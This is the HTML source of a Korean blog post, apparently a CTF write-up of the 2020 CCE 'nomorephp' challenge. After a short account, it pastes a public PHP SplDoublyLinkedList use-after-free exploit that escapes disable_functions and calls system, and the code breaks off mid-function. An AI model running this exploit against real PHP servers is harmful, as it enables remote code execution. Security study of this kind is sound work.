@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    <title>2020 CCE - nomorephp | kimtruth&#39;s Blog</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="2020 CCE">
+    
+    <meta name="description" content="문제는 이게 끝이다. 1234&amp;lt;?php    eval($_GET[&apos;code&apos;]);    show_source(__FILE__);?&amp;gt; 우선 http://54.180.143.146/?code=phpinfo();로 phpinfo 를 확인해보면 아래와 같은 정보들을 얻을 수 있다. - PHP Version 7.4.10- open_basedir /var">
+<meta name="keywords" content="2020 CCE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020 CCE - nomorephp">
+<meta property="og:url" content="https://kimtruth.github.io/2020/09/27/2020-CCE-nomorephp/index.html">
+<meta property="og:site_name" content="kimtruth&#39;s Blog">
+<meta property="og:description" content="문제는 이게 끝이다. 1234&amp;lt;?php    eval($_GET[&apos;code&apos;]);    show_source(__FILE__);?&amp;gt; 우선 http://54.180.143.146/?code=phpinfo();로 phpinfo 를 확인해보면 아래와 같은 정보들을 얻을 수 있다. - PHP Version 7.4.10- open_basedir /var">
+<meta property="og:locale" content="kr">
+<meta property="og:image" content="https://kimtruth.github.io/2020/09/27/2020-CCE-nomorephp/0.png">
+<meta property="og:updated_time" content="2020-09-26T14:10:32.582Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2020 CCE - nomorephp">
+<meta name="twitter:description" content="문제는 이게 끝이다. 1234&amp;lt;?php    eval($_GET[&apos;code&apos;]);    show_source(__FILE__);?&amp;gt; 우선 http://54.180.143.146/?code=phpinfo();로 phpinfo 를 확인해보면 아래와 같은 정보들을 얻을 수 있다. - PHP Version 7.4.10- open_basedir /var">
+<meta name="twitter:image" content="https://kimtruth.github.io/2020/09/27/2020-CCE-nomorephp/0.png">
+<meta property="fb:admins" content="1984693938443783">
+<meta property="fb:app_id" content="1984693938443783">
+    
+
+    
+
+    
+        <link rel="icon" href="/images/favicon.ico">
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.0.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-88959679-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+
+
+<link rel="alternate" href="/rss2.xml" title="kimtruth's Blog" type="application/rss+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+</html>
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+            <!--
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+            -->
+            <div id="header-title" style="text-align:left">
+                <h1>
+                    <a href="/" style="font-size:40px;color:#fff; font-weight:bold; font-style: italic;text-decoration: none;">kimtruth's Blog</a>
+                </h1>
+            </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Inici</a>
+                                </li>
+                            
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/">Development</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/Algorithm/">Algorithm</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/iOS/">iOS</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/">Hacking</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Crpto/">Crpto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Forensic/">Forensic</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Network/">Network</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Pwnable/">Pwnable</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Reversing/">Reversing</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Web/">Web</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Question/">Question</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Story/">Story</a></li></ul>
+                                    
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="https://www.rocketpunch.com/@kimtruth">Quant a</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Cercar" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'categories',
+            TAGS: 'etiquetes',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/Hacking/Web/">Web</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-2020-CCE-nomorephp" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        2020 CCE - nomorephp
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2020/09/27/2020-CCE-nomorephp/" class="article-date">
+            <time datetime="2020-09-26T15:00:00.000Z" itemprop="datePublished">2020-09-27</time>
+        </a>
+    </div>
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/2020-CCE/">2020 CCE</a>
+    </div>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <img src="/2020/09/27/2020-CCE-nomorephp/0.png">
+<p>문제는 이게 끝이다.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>우선 <code>http://54.180.143.146/?code=phpinfo();</code>로 <code>phpinfo</code> 를 확인해보면 아래와 같은 정보들을 얻을 수 있다.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- PHP Version 7.4.10</span><br><span class="line">- open_basedir /var/www/html</span><br><span class="line">- disable_functions : 	pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,fwrite,ini_set,chdir</span><br></pre></td></tr></table></figure>
+<p>버전이 생각보다 최신버전이고.. disable function들이 많아서 <code>.so</code>파일을 업로드해서 <code>setenv</code>로 <code>LD_PRELOAD</code> 설정하고 <code>error_log</code>나 <code>mail</code>함수로 트리거 하는게 전형적인 bypass 방식이지만<br>우선 이 문제는 그 어느곳에도 업로드할만한 곳이 보이질 않았다. <code>/tmp</code>도 업로드가 안되고..</p>
+<p>근데 검색해보니 그저께 7.4.10 에서도 가능한 UAF Sandbox Escape 코드 글이 올라왔었다.<br><a href="https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/" target="_blank" rel="noopener">https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/</a></p>
+<p>그대로 코드 복붙하니.. 됐다..<br>저 글을 보기전에 긴 시간동안 삽질을 했다보니 좀 많이 허탈하기도 했고 문제 의도가 궁금하기도 하고.. 그냥 이 write-up은 기록차 올리기로 했다..<br><figure class="highlight php"><figcaption><span>uaf.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># PHP SplDoublyLinkedList::offsetUnset UAF</span></span><br><span class="line"><span class="comment"># Charles Fol (@cfreal_)</span></span><br><span class="line"><span class="comment"># 2020-08-07</span></span><br><span class="line"><span class="comment"># PHP is vulnerable from 5.3 to 8.0 alpha</span></span><br><span class="line"><span class="comment"># This exploit only targets PHP7+.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.</span></span><br><span class="line"><span class="comment"># Said iteration is done by keeping a pointer to the "current" DLL element.</span></span><br><span class="line"><span class="comment"># You can then call next() or prev() to make the DLL point to another element.</span></span><br><span class="line"><span class="comment"># When you delete an element of the DLL, PHP will remove the element from the</span></span><br><span class="line"><span class="comment"># DLL, then destroy the zval, and finally clear the current ptr if it points</span></span><br><span class="line"><span class="comment"># to the element. Therefore, when the zval is destroyed, current is still</span></span><br><span class="line"><span class="comment"># pointing to the associated element, even if it was removed from the list.</span></span><br><span class="line"><span class="comment"># This allows for an easy UAF, because you can call $dll-&gt;next() or</span></span><br><span class="line"><span class="comment"># $dll-&gt;prev() in the zval's destructor.</span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">define(<span class="string">'NB_DANGLING'</span>, <span class="number">200</span>);</span><br><span class="line">define(<span class="string">'SIZE_ELEM_STR'</span>, <span class="number">40</span> - <span class="number">24</span> - <span class="number">1</span>);</span><br><span class="line">define(<span class="string">'STR_MARKER'</span>, <span class="number">0xcf5ea1</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2s</span><span class="params">(&amp;$s, $p, $i, $x=<span class="number">8</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$x;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $s[$p+$j] = chr($i &amp; <span class="number">0xff</span>);</span><br><span class="line">        $i &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">s2i</span><span class="params">(&amp;$s, $p, $x=<span class="number">8</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($j=$x<span class="number">-1</span>;$j&gt;=<span class="number">0</span>;$j--)</span><br><span class="line">    &#123;</span><br><span class="line">        $i &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        $i |= ord($s[$p+$j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UAFTrigger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#"print('UAF __destruct: ' . "\n");</span></span><br><span class="line">        $dlls[NB_DANGLING]-&gt;offsetUnset(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># At this point every $dll-&gt;current points to the same freed chunk. We allocate</span></span><br><span class="line">        <span class="comment"># that chunk with a string, and fill the zval part</span></span><br><span class="line">        $fake_dll_element = str_shuffle(str_repeat(<span class="string">'A'</span>, SIZE_ELEM_STR));</span><br><span class="line">        i2s($fake_dll_element, <span class="number">0x00</span>, <span class="number">0x12345678</span>); <span class="comment"># ptr</span></span><br><span class="line">        i2s($fake_dll_element, <span class="number">0x08</span>, <span class="number">0x00000004</span>, <span class="number">7</span>); <span class="comment"># type + other stuff</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Each of these dlls current-&gt;next pointers point to the same location,</span></span><br><span class="line">        <span class="comment"># the string we allocated. When calling next(), our fake element becomes</span></span><br><span class="line">        <span class="comment"># the current value, and as such its rc is incremented. Since rc is at</span></span><br><span class="line">        <span class="comment"># the same place as zend_string.len, the length of the string gets bigger,</span></span><br><span class="line">        <span class="comment"># allowing to R/W any part of the following memory</span></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt;= NB_DANGLING; $i++)</span><br><span class="line">            $dlls[$i]-&gt;next();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(strlen($fake_dll_element) &lt;= SIZE_ELEM_STR)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Exploit failed: fake_dll_element did not increase in size'</span>);</span><br><span class="line"></span><br><span class="line">        $leaked_str_offsets = [];</span><br><span class="line">        $leaked_str_zval = [];</span><br><span class="line"></span><br><span class="line">        <span class="comment"># In the memory after our fake element, that we can now read and write,</span></span><br><span class="line">        <span class="comment"># there are lots of zend_string chunks that we allocated. We keep three,</span></span><br><span class="line">        <span class="comment"># and we keep track of their offsets.</span></span><br><span class="line">        <span class="keyword">for</span>($offset = SIZE_ELEM_STR + <span class="number">1</span>; $offset &lt;= strlen($fake_dll_element) - <span class="number">40</span>; $offset += <span class="number">40</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># If we find a string marker, pull it from the string list</span></span><br><span class="line">            <span class="keyword">if</span>(s2i($fake_dll_element, $offset + <span class="number">0x18</span>) == STR_MARKER)</span><br><span class="line">            &#123;</span><br><span class="line">                $leaked_str_offsets[] = $offset;</span><br><span class="line">                $leaked_str_zval[] = $strs[s2i($fake_dll_element, $offset + <span class="number">0x20</span>)];</span><br><span class="line">                <span class="keyword">if</span>(count($leaked_str_zval) == <span class="number">3</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count($leaked_str_zval) != <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Exploit failed: unable to leak three zend_strings'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># free the strings, except the three we need</span></span><br><span class="line">        $strs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Leak adress of first chunk</span></span><br><span class="line">        <span class="keyword">unset</span>($leaked_str_zval[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>($leaked_str_zval[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">unset</span>($leaked_str_zval[<span class="number">2</span>]);</span><br><span class="line">        $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># At this point we have 3 freed chunks of size 40, which we can read/write,</span></span><br><span class="line">        <span class="comment"># and we know their address.</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'Address of first RW chunk: 0x'</span> . dechex($first_chunk_addr) . <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># In the third one, we will allocate a DLL element which points to a zend_array</span></span><br><span class="line">        $rw_dll-&gt;push([<span class="number">3</span>]);</span><br><span class="line">        $array_addr = s2i($fake_dll_element, $leaked_str_offsets[<span class="number">2</span>] + <span class="number">0x18</span>);</span><br><span class="line">        <span class="comment"># Change the zval type from zend_object to zend_string</span></span><br><span class="line">        i2s($fake_dll_element, $leaked_str_offsets[<span class="number">2</span>] + <span class="number">0x20</span>, <span class="number">0x00000006</span>);</span><br><span class="line">        <span class="keyword">if</span>(gettype($rw_dll[<span class="number">0</span>]) != <span class="string">'string'</span>)</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Exploit failed: Unable to change zend_array to zend_string'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># We can now read anything: if we want to read 0x11223300, we make zend_string*</span></span><br><span class="line">        <span class="comment"># point to 0x11223300-0x10, and read its size using strlen()</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read zend_array-&gt;pDestructor</span></span><br><span class="line">        $zval_ptr_dtor_addr = read($array_addr + <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'Leaked zval_ptr_dtor address: 0x'</span> . dechex($zval_ptr_dtor_addr) . <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Use it to find zif_system</span></span><br><span class="line">        $system_addr = get_system_address($zval_ptr_dtor_addr);</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'Got PHP_FUNCTION(system): 0x'</span> . dechex($system_addr) . <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># In the second freed block, we create a closure and copy the zend_closure struct</span></span><br><span class="line">        <span class="comment"># to a string</span></span><br><span class="line">        $rw_dll-&gt;push(<span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123;&#125;);</span><br><span class="line">        $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[<span class="number">1</span>] + <span class="number">0x18</span>);</span><br><span class="line">        $data = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x200</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x138</span>; $i += <span class="number">8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            i2s($data, $i, read($closure_addr + $i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Change internal func type and pointer to make the closure execute system instead</span></span><br><span class="line">        i2s($data, <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        i2s($data, <span class="number">0x68</span>, $system_addr);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Push our string, which contains a fake zend_closure, in the last freed chunk that</span></span><br><span class="line">        <span class="comment"># we control, and make the second zval point to it.</span></span><br><span class="line">        $rw_dll-&gt;push($data);</span><br><span class="line">        $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[<span class="number">0</span>] + <span class="number">0x18</span>) + <span class="number">24</span>;</span><br><span class="line">        i2s($fake_dll_element, $leaked_str_offsets[<span class="number">1</span>] + <span class="number">0x18</span>, $fake_zend_closure);</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'Replaced zend_closure by the fake one: 0x'</span> . dechex($fake_zend_closure) . <span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Calling it now</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'Running system("cat /flag");'</span> . <span class="string">"\n"</span>);</span><br><span class="line">        $rw_dll[<span class="number">1</span>](<span class="string">'cat /flag'</span>);</span><br><span class="line"></span><br><span class="line">        print_r(<span class="string">'DONE'</span>.<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DanglingTrigger</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($i)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;i = $i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span 